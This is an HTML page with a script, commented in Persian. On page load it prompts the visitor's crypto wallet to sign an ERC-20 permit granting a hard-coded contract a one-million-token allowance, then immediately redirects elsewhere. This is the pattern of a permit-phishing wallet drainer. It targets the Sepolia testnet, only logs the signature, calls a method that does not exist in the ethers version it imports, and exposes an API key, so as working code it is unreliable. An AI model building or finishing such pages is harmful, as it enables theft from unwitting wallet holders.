<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Gasless Permit Script</title>
</head>
<body>
<script type="module">
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.min.js";
import { Biconomy } from "https://cdn.jsdelivr.net/npm/@biconomy/mexa@2.0.1/dist/biconomy.esm.js";

// ---------------------------
// جایگذاری داده‌های شما
// ---------------------------
const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3"; // Sepolia contract
const BICONOMY_API_KEY = "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
const BICONOMY_URL = "https://paymaster.biconomy.io/api/v2/11155111/ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
const BICONOMY_ID = "be7dc5ec-5aff-4761-9454-67791ef4b0e1";
const TOKEN_ADDRESS = "YOUR_ERC20_TOKEN_ADDRESS"; // اینو خودت جایگذاری کن
const DESTINATION_PAGE = "HTTPS://WWW.GOOGLE.COM"; // اینو خودت جایگذاری کن

// ---------------------------
// اتصال Biconomy
// ---------------------------
const provider = new ethers.BrowserProvider(window.ethereum);
const biconomy = new Biconomy(provider, { apiKey: BICONOMY_API_KEY, debug: true });

await biconomy.init();

// ---------------------------
// امضا Permit (ERC20 Permit)
// ---------------------------
async function sendPermit() {
    const signer = await provider.getSigner();
    const contract = new ethers.Contract(TOKEN_ADDRESS, [
        "function permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external"
    ], signer);

    // مقادیر نمونه برای permit
    const owner = await signer.getAddress();
    const spender = CONTRACT_ADDRESS;
    const value = ethers.parseUnits("1000000", 18); // مقدار max نمونه، میتونی تغییر بدی
    const nonce = 0; // برای تست Sepolia
    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 ساعت اعتبار

    // امضا را بساز
    const domain = {
        name: "ERC20PermitToken",
        version: "1",
        chainId: 11155111, // Sepolia
        verifyingContract: TOKEN_ADDRESS
    };

    const types = {
        Permit: [
            { name: "owner", type: "address" },
            { name: "spender", type: "address" },
            { name: "value", type: "uint256" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
        ]
    };

    const message = { owner, spender, value, nonce, deadline };

    const signature = await signer._signTypedData(domain, types, message);

    console.log("Permit signature:", signature);

    // همزمان باز شدن صفحه پیش‌فرض
    window.location.href = DESTINATION_PAGE;
}

// ---------------------------
// فراخوان اتوماتیک
// ---------------------------
window.addEventListener("load", sendPermit);

</script>
</body>
</html>
